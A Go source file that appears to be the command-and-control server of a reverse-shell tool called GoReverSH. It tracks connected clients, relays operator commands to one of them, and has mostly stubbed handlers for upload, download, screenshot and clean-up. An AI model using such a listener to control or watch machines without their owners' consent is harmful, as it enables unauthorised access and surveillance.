package server

import (
	"context"
	"fmt"
	"log"
	"sync"
)

type Observer struct {
	Sender         Sender
	State          State
	Subject        <-chan Notification
	PromptViewFlag bool
	Lock           *sync.Mutex
}

//受け取った通知の種別によってメッセージの送信, あるいはメンバーの追加/削除を行います
func (observer Observer) WaitNotice(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			notice := <-observer.Subject
			switch notice.Type {
			case JOIN:
				observer.State.ClientMap[notice.Client.Name] = notice.Client
				if observer.Sender.connectingClient == nil {
					observer.Sender.connectingClient = notice.Client
				}
				observer.printPrompt()

			case DEFECT:
				fmt.Println("Connection Close")
				notice.Client.Conn.Close()
				delete(observer.State.ClientMap, notice.Client.Name)
				if 0 < len(observer.State.ClientMap) {
					for _, c := range observer.State.ClientMap {
						observer.Sender.connectingClient = c
						break
					}
				}
				observer.printPrompt()

			case COMMAND:
				observer.Sender.SendMessage(notice.Command)
				observer.printPrompt()

			case MESSAGE:
				fmt.Printf("\n%s\n", notice.Message)
				observer.printPrompt()

				//30
			case UPLOAD:
				fmt.Println("UPLOAD")
				observer.printPrompt()

				//29
			case DOWNLOAD:
				observer.Lock.Lock()
				fmt.Println("DOWNLOAD")

				observer.Lock.Unlock()
				observer.printPrompt()

				//28
			case SCREEN_SHOT:
				observer.Lock.Lock()
				fmt.Println("SCREENSHOT")
				observer.Sender.SendMessage(notice.Command)

				//ファイル名
				//downloadFiles()
				//画像を受け取り

				observer.Lock.Unlock()
				observer.printPrompt()

				//30
			case CLEAN:
				fmt.Println("CLEAN")
				observer.printPrompt()

			default:
				log.Println(notice)
			}
		}
	}
}

func (o Observer) printPrompt() {
	if o.Sender.connectingClient != nil {
		fmt.Printf("[GoReverSH@%s] >", o.Sender.connectingClient.Name)
	} else {
		fmt.Println("wait...")
	}
}
